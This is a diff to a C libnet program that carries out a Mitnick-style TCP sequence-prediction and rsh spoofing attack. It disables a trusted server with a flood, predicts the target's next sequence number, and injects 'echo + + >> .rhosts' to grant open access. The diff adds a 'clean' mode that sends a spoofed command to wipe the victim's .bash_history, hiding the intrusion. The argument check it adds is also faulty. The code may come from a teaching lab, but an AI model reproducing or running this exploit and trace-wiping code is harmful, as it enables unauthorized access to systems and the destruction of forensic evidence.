@@ -15,11 +15,14 @@
 #define DSTPORT 514
 #define EXPLOIT "0\0tsutomu\0tsutomu\0echo + + >> .rhosts"
 #define EXPLOITLEN 38
+#define CLEAN "0\0tsutomu\0tsutomu\0echo "">.bash_history"
+#define CLEANLEN 40
 
 void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l);
 
-int main()
+int main(int argc, char **argv)
 {
+
 
     //variables for storing IP adresses
     u_long server;
@@ -28,6 +31,10 @@ int main()
     //Libnet Context and buffer for storing error
     libnet_t *l;  
     char errbuf[LIBNET_ERRBUF_SIZE];
+    int clean=0;
+    
+    if((argc==1)&&(strcmp(argv[1],"clean")==0))
+        clean=1;
     
     l = libnet_init(LIBNET_RAW4, NULL, errbuf);
 
@@ -58,7 +65,7 @@ int main()
 
 
     //Server flood
-    printf("\n Disabling server...");
+    printf("\nDisabling server...");
     fflush(stdout);
     disableServer(l,kevin,server);
 
@@ -68,18 +75,27 @@ int main()
     //Retrieve the next sequence of xterminal
     uint32_t next=getNextSeq(l,kevin,xterminal,514,514,des);
 
-    printf("\n Next: %u",next);
+    printf("\nNext: %u",next);
     fflush(stdout);
-    //Exploiting RSH
-    printf("\n EXPLOITING");
-    sendExploit(next,EXPLOIT,EXPLOITLEN,xterminal,server, l );
-
+    if (clean==0)
+    {
+        //Exploiting RSH
+        printf("\nEXPLOITING");
+        sendExploit(next,EXPLOIT,EXPLOITLEN,xterminal,server, l );
+    }
+    else
+    {
+        printf("\nCLEANING");
+        sendExploit(next,CLEAN,CLEANLEN,xterminal,server, l );
+    }
+    
     usleep(1000);
 
     //RESTORE THE SERVER
     printf("\n Enabling the server...");
     fflush(stdout);
     enableServer(l,kevin,server);
+
 
 
     libnet_destroy(l);
